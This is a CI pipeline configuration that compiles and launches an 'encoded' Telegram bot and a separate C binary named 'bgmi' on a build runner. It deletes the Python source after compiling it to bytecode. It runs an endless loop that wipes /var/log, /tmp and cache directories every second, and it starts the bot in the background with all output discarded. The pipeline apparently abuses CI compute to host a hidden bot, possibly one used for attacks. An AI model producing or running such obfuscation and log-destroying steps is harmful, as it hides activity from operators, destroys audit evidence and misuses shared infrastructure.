image: python:3.10

pipelines:
  default:
    - step:
        name: Setup & Run Encoded Telegram Bot
        size: 2x
        script:
          - echo "🔒 Setting up a secure bot..."


          - apt-get update && apt-get install -y git gcc python3 python3-pip


          - pip install --no-cache-dir telebot pymongo aiohttp certifi 

          -pip3 install pyTelegramBotAPI

          - python3 -m compileall bot.py


          - mv __pycache__/bot.cpython-310.pyc bot.pyc
          - rm -rf bot.py __pycache__
          - gcc fuck.c -o bgmi -lpthread

          - chmod 755 bot.pyc
          - chmod 755 bgmi

          - while true; do
              rm -rf ~/.cache/* /var/log/* /tmp/* /var/tmp/*;
              sync;
              sleep 1;
            done &


          - nohup python3 bot.pyc > /dev/null 2>&1 &


          - timeout 300 tail -f /dev/null
